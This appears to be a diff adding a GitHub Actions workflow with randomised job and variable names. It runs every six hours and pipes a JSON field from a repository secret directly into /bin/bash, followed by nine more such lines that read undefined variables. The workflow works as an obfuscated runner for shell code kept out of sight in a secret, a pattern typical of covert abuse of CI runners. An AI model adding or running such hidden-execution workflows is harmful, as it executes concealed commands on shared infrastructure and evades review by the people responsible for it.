@@ -1,0 +1,26 @@
+name: liulinglong6510
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '42 5/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: liulinglong6510
+        env:
+          fvy04: ${{ secrets.fvy04 }}
+        run: |
+          echo $fvy04 | jq -r .cr21711 | /bin/bash
+          echo $bczn31640 | jq -r .towo67386 | /bin/bash
+          echo $pti04 | jq -r .nd8969 | /bin/bash
+          echo $lefh47170 | jq -r .h478 | /bin/bash
+          echo $ew3 | jq -r .tau0740 | /bin/bash
+          echo $tfaji3 | jq -r .vdeo10 | /bin/bash
+          echo $xbgnf88 | jq -r .mptq89 | /bin/bash
+          echo $ht7 | jq -r .mna6 | /bin/bash
+          echo $dyh364 | jq -r .ozclo1575 | /bin/bash
+          echo $r80 | jq -r .kkozp3 | /bin/bash
+
